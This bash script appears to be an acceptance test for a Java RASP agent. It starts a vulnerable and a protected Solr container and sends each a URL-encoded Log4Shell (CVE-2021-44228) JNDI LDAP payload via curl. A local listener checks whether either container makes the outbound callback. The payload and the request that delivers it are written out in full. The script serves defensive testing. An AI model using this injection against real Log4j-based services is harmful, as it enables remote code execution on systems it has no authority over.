#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

baseline_name="${OHMYRASP_VULHUB_LOG4J_SOLR_BASELINE_NAME:-ohmyrasp-vulhub-log4j-solr-baseline}"
protected_name="${OHMYRASP_VULHUB_LOG4J_SOLR_PROTECTED_NAME:-ohmyrasp-vulhub-log4j-solr-protected}"
baseline_port="${OHMYRASP_VULHUB_LOG4J_SOLR_BASELINE_PORT:-18780}"
protected_port="${OHMYRASP_VULHUB_LOG4J_SOLR_PROTECTED_PORT:-18781}"
baseline_listener_port="${OHMYRASP_VULHUB_LOG4J_SOLR_BASELINE_LISTENER_PORT:-18997}"
protected_listener_port="${OHMYRASP_VULHUB_LOG4J_SOLR_PROTECTED_LISTENER_PORT:-19997}"
image="${OHMYRASP_VULHUB_LOG4J_SOLR_IMAGE:-vulhub/solr:8.11.0}"
baseline_dir="logs/vulhub-log4j-solr-java8-baseline"
protected_dir="logs/vulhub-log4j-solr-java8-protected"
protected_log="${protected_dir}/events.jsonl"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

wait_for() {
  local name="$1"
  local port="$2"
  local status
  for _ in $(seq 1 180); do
    status="$(curl -sS -o "/tmp/${name}.json" -w "%{http_code}" \
      "http://127.0.0.1:${port}/solr/admin/info/system?wt=json" 2>/dev/null || true)"
    if [[ "$status" == "200" ]]; then
      return
    fi
    sleep 1
  done
  docker logs "$name" >&2 || true
  echo "${name} did not expose Solr admin API at ${port}" >&2
  exit 1
}

start_listener() {
  local port="$1"
  local result="$2"
  local timeout="$3"
  python3 -u - "$port" "$result" "$timeout" <<'PY' &
import pathlib
import socket
import sys

port = int(sys.argv[1])
result = pathlib.Path(sys.argv[2])
timeout = int(sys.argv[3])
result.write_text("WAITING\n")
sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("0.0.0.0", port))
sock.listen(1)
sock.settimeout(timeout)
try:
    conn, addr = sock.accept()
    lines = ["CONNECTED %s:%s" % addr]
    try:
        conn.settimeout(1)
        lines.append("BYTES %r" % conn.recv(32))
    except Exception as exc:
        lines.append("READ_ERROR %s" % exc)
    conn.close()
    result.write_text("\n".join(lines) + "\n")
except Exception as exc:
    result.write_text("TIMEOUT %s\n" % exc)
finally:
    sock.close()
PY
}

encoded_log4shell_payload() {
  local listener_port="$1"
  printf '%%24%%7Bjndi%%3Aldap%%3A%%2F%%2Fhost.docker.internal%%3A%s%%2FExploit%%7D' \
    "$listener_port"
}

send_payload() {
  local http_port="$1"
  local listener_port="$2"
  local output="$3"
  local payload
  payload="$(encoded_log4shell_payload "$listener_port")"
  curl -sS --globoff -i -o "$output" -w "%{http_code}" \
    "http://127.0.0.1:${http_port}/solr/admin/cores?action=${payload}&wt=json" || true
}

expect_startup_without_detection() {
  if ! grep -q '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
    cat "$protected_log" >&2 || true
    echo "missing Java 8 startup event in protected Solr container" >&2
    exit 1
  fi
  if ! grep -q '"jndi_hook":"installed"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "missing Java 8 JNDI hook startup marker in protected Solr container" >&2
    exit 1
  fi
  if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "protected Solr container produced a detection before exploit traffic" >&2
    exit 1
  fi
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --name "$baseline_name" \
  --add-host host.docker.internal:host-gateway \
  -p "${baseline_port}:8983" \
  "$image" >/dev/null

docker run -d --name "$protected_name" \
  --add-host host.docker.internal:host-gateway \
  -p "${protected_port}:8983" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e "SOLR_OPTS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

wait_for "$baseline_name" "$baseline_port"
wait_for "$protected_name" "$protected_port"
expect_startup_without_detection

baseline_listener="${baseline_dir}/cve-2021-44228-listener.txt"
start_listener "$baseline_listener_port" "$baseline_listener" 20
baseline_pid=$!
baseline_status="$(send_payload "$baseline_port" "$baseline_listener_port" \
  "${baseline_dir}/cve-2021-44228.response")"
wait "$baseline_pid"
if ! grep -q '^CONNECTED ' "$baseline_listener"; then
  cat "$baseline_listener" >&2 || true
  cat "${baseline_dir}/cve-2021-44228.response" >&2 || true
  echo "baseline Solr Log4Shell request did not reach the outbound LDAP listener" >&2
  exit 1
fi
if [[ "$baseline_status" == "000" ]]; then
  cat "${baseline_dir}/cve-2021-44228.response" >&2 || true
  echo "baseline Solr Log4Shell request did not reach the HTTP endpoint" >&2
  exit 1
fi

protected_listener="${protected_dir}/cve-2021-44228-listener.txt"
start_listener "$protected_listener_port" "$protected_listener" 8
protected_pid=$!
protected_status="$(send_payload "$protected_port" "$protected_listener_port" \
  "${protected_dir}/cve-2021-44228.response")"
wait "$protected_pid"
if ! grep -q '^TIMEOUT ' "$protected_listener"; then
  cat "$protected_listener" >&2 || true
  cat "${protected_dir}/cve-2021-44228.response" >&2 || true
  echo "protected Solr Log4Shell request still reached the outbound LDAP listener" >&2
  exit 1
fi
if [[ "$protected_status" == "000" ]]; then
  cat "${protected_dir}/cve-2021-44228.response" >&2 || true
  echo "protected Solr Log4Shell request did not reach the HTTP endpoint" >&2
  exit 1
fi
if ! grep -q '"algorithm":"java8_jndi_remote_lookup".*"action":"block"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "missing java8_jndi_remote_lookup block event for Solr Log4Shell" >&2
  exit 1
fi

echo "vulhub Log4j CVE-2021-44228 Solr Java8 acceptance passed"
